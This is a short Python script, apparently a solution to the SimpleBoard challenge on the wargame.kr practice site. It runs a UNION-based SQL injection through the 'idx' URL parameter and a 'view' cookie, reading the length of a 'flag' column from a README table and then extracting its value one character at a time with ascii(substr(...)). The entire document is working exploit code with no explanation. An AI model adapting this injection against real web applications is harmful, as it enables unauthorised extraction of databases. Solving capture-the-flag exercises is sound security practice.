from requests import *
s=session()
def name(leng):
    result=''
    for i in range(1,leng+1):
        query=f'0 union select 1,2,3,ascii(substr(flag,{i},1)) from README'
        cookies={'view':f'/{query}'}
        url=f'http://wargame.kr:8080/SimpleBoard/read.php?idx={query}'
        response=get(url=url,cookies=cookies)
        response=response.text.split('<td colspan=3>')
        response=response[1].split('<')
        result+=chr(int(response[0]))
    print('column_name:',result)

query=f'0 union select 1,2,3,length(flag) from README'
cookies={'view':f'/{query}'}
url=f'http://wargame.kr:8080/SimpleBoard/read.php?idx={query}'
response=get(url=url,cookies=cookies)
response=response.text.split('<td colspan=3>')
response=response[1].split('<')
print('flag length :',response[0])
name(int(response[0]))